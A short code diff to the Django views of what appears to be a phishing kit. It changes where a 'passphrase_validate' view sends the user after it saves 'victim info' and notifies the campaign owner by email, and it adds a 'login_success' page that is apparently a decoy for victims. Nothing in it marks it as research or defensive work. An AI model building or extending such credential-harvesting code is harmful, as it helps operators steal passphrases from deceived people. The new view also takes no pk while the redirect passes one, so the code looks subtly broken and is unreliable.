@@ -195,7 +195,7 @@ def passphrase_validate(request, campaign_id):
             send_victim_info_notification(user_email=campaign.user.email, campaign=campaign)
             messages.success(request, 'Victim info saved successfully!')
 
-            return redirect('core:success', pk=campaign.id)  # Redirect to view all submitted info
+            return redirect('core:login_success', pk=campaign.id)  # Redirect to view all submitted info
     else:
         form = PassphraseForm()
 
@@ -252,8 +252,8 @@ def success(request, pk):
     
     return render(request, 'core/success.html', {'campaign': campaign})
 
-
-
+def login_success(request):
+    return render(request, 'core/login_success.html')
 
 
 
